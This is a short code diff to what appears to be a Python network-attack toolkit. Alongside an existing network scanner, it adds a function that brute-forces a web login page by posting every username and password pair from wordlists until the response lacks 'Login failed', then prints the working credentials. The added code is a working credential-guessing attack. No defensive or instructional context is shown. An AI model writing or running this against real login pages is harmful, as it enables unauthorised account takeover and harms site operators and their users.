@@ -42,4 +42,23 @@ def scan_network():
     
     for sent, received in result:
         print(f"[+] Device IP: {received.psrc}, MAC: {received.hwsrc}")
+    
+    
+def brute_force_login():
+    url = input("[+] Enter the URL of the login page: ")
+    username_file = "usernames.txt" # Replace with file with list of usernames
+    password_file = "passwords.txt" # Replace with file with list of common passwords
+    
+    with open(username_file, 'r') as uf:
+        usernames = uf.read().strip().splitlines()
         
+    with open(password_file, 'r') as pf:
+        passwords = pf.read().strip().splitlines()
+        
+    for username in usernames:
+        for password in passwords:
+            login_data = {'username': username, 'password': password, 'submit': 'login'}
+            response = requests.post(url, data=login_data)
+            if 'Login failed' not in response.text:
+                print(f"[+] Login successful with username: {username} and password: {password}")
+                return
